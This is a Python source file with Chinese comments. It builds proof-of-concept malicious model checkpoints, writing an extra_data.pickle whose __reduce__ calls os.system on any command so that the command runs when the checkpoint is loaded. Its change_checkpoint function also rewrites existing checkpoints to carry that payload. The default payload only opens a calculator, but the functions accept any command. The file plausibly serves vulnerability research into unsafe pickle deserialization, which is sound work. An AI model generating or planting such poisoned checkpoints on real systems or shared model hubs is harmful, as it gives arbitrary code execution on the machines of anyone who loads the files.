import os
import pickle
from typing import Union

from transformers import TFAutoModel
from typing_extensions import LiteralString

from src.utils.command_util import get_open_calc_command
from src.utils.file_util import ensure_directory_exists


########################################################################################################################


def change_checkpoint(checkpoint_directory_path: str, command: str):
    """
    用于把已有的checkpoint修改为能够执行命令
    :param checkpoint_directory_path: 要修改的checkpoint文件所在的目录
    :param command: 要执行的命令
    :return:
    """
    # 确保提供的路径是一个目录
    extra_data_pickle_path = find_extra_data_pickle(checkpoint_directory_path)
    if not extra_data_pickle_path:
        return
    generate_extra_data_pickle(extra_data_pickle_path, command)


def find_extra_data_pickle(directory_path) -> Union[None, LiteralString, str, bytes]:
    """
    在给定的目录下找到第一个extra_data.pickle文件
    TODO 2024-10-20 11:10:27 对所有的extra_data.pickle文件都进行修改
    TODO 2024-10-20 11:10:41 能够兼容传入的本身就是一个extra_data.pickle文件的路劲的情况
    :param directory_path:
    :return:
    """
    # 确保提供的路径是一个目录
    if not os.path.isdir(directory_path):
        print(f"The provided path '{directory_path}' is not a valid directory.")
        return None

    # 使用os.walk遍历目录
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if file == 'extra_data.pickle':
                return os.path.join(root, file)
    # 如果没有找到文件，返回None
    return None


########################################################################################################################

def generate_open_calc_command_checkpoint(directory_path: str, model: str):
    """
    在给定的路径下生成一个只弹计算器的checkpoint，当这份checkpoint被加载的时候会触发命令执行
    用于证明确实有危害，但不实际造成危害
    :param directory_path: 生成的checkpoint在哪个文件夹下
    :param model: 要生成哪个模型的权重，可以是一个在huggingface上存在的模型的id，也可以是一个本地的文件夹路径
    :return:
    """
    generate_command_checkpoint(directory_path, model, get_open_calc_command())


def generate_command_checkpoint(directory_path: str, model: str, command: str):
    """
    在给定的路径下生成可以给定命令的checkpoint，当这份checkpoint被加载的时候会触发命令执行
    :param directory_path: 生成的checkpoint在哪个文件夹下
    :param model: 要生成哪个模型的权重，可以是一个在huggingface上存在的模型的id，也可以是一个本地的文件夹路径
    :param command: checkpoint被加载的时候执行的命令是啥
    :return:
    """
    directory_path = os.path.join(directory_path, 'checkpoint')
    ensure_directory_exists(directory_path)

    extra_data_pickle = os.path.join(directory_path, 'extra_data.pickle')
    generate_extra_data_pickle(extra_data_pickle, command)

    weights = os.path.join(directory_path, 'weights.h5')
    generate_weights_h5(weights, model)


def generate_extra_data_pickle(filepath, command):
    """
    生成extra_data.pickle文件，这个文件被加载的时候会执行给定的命令
    :param filepath: extra_data.pickle文件的位置
    :param command: 要执行的命令
    :return:
    """

    class CommandExecute:
        def __reduce__(self):
            """
            在 pickle.load(f) 的时候，此处的命令会被执行
            :return:
            """
            return os.system, (command,)

    poc = CommandExecute()
    with open(filepath, 'wb') as fp:
        pickle.dump(poc, fp)


def generate_weights_h5(filepath: str, model: str):
    """
    生成weights.h5文件，但是这个权重文件一般是要跟模型架构绑定的，所以具体还是要看模型架构的，要不然第一步加载权重就会报错走不过去
    :param filepath: weights.h5文件保存到的路径
    :param model: 要生成哪个模型的权重，可以是一个在huggingface上存在的模型的id，也可以是一个本地的文件夹路径
    :return:
    """
    # TODO 2024-10-20 00:20:09 考虑使用hg的国内镜像？如果不翻墙的话模型文件应该是下载不下来或者下载得很慢
    # 加载预训练的模型，是要跟具体的模型架构绑定的
    model = TFAutoModel.from_pretrained(model)
    # 保存权重到weights.h5文件，这样checkpoint被加载的时候才不会报错
    model.save_weights(filepath)
